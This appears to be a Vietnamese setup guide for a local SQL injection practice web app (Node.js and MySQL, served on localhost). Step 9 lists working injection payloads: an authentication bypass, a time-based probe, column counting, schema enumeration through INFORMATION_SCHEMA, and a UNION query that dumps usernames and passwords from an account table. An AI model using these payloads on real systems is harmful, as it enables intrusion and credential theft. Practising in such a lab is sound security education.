1. Cài ứng dụng
    - Nodejs
    - MySql
    - Vscode

2. Vào ứng dụng MySql và tạo một database "sql_injection"

3. Import database trong thư mục database vào mysql

4. Mở ứng dụng bằng vscode

5. Vào file database.js (model/database.js) chỉnh sửa "username" (dòng 5) và "password" (dòng 6) - chính là username và password của database cần kết nối

6. Mở terminal (cmd)

7. Gõ lệnh: 
    - npm install --global yarn (Nếu đã cài yarn thì không cần thực hiện câu lệnh này)
    - yarn
    - yarn start

8. Mở trình duyệt với url: "http://localhost:3000"

9. Các câu lệnh tấn công thử trên web:
    - ' OR 1 = 1 --
    - ' AND SLEEP(1) --
    - ' ORDER BY 4 --
    - ' ORDER BY 5 --
    - ' UNION SELECT 1, 2, 3, 4 --
    - ' UNION SELECT 1, GROUP_CONCAT(TABLE_NAME), 3, 4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA= DATABASE() -- ' UNION SELECT 1, GROUP_CONCAT(COLUMN_NAME), 3, 4 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'account' --
    - ' UNION SELECT id, password, username, 4 FROM account --

10. Note:
    - Trường hợp xảy ra lỗi khi chạy "yarn start" xem tại link "https://stackoverflow.com/questions/50093144/mysql-8-0-client-does-not-support-authentication-protocol-requested-by-server"
    - Đằng sau mỗi dấu -- ở phần 8 luôn có 1 dấu cách